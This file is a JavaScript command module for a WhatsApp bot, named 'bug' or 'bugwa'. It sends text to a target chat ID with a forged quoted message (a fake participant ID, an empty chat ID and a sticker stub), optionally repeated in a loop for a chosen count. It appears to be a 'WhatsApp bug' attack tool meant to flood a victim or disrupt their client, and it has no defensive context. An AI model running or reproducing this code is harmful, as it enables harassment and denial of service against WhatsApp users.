module.exports = {
  name: 'bug',
  alias: ['bugwa'],
  async exec(msg, sock, args) {
    if (args[3]) {
      for (let i = 0; i < args[3]; i++) {
        await sock.sendMessage(args[0], { text: args[1] }, { quoted: { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "" }, message: { stickerMessage: { isAnimated: false }}}})
      }
    } else {
      await sock.sendMessage(args[0], { text: args[1] }, { quoted: { key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "" }, message: { stickerMessage: { isAnimated: false }}}})
    }
  }
}
